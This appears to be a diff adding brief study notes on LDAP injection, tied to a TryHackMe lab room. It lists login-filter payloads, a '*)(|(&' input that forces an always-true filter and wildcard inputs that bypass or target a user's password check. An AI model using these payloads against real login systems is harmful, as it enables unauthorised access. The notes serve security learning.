@@ -1,0 +1,23 @@
+######################
+### ldap injection ###
+######################
+## links
+# https://tryhackme.com/r/room/ldapinjection
+
+
+## injection
+(&(uid={userInput})(userPassword={passwordInput}))				# user data injected
+	userInput	= *)(|(&
+	passwordInput	= pwd)
+	(&(uid=*)(|(&)(userPassword=pwd)))
+
+
+## wildard
+(&(uid={userInput})(userPassword={passwordInput}))
+	userInput	= *
+	passwordInput	= *
+OR
+        userInput       = a*							# target a user
+        passwordInput   = *
+
+
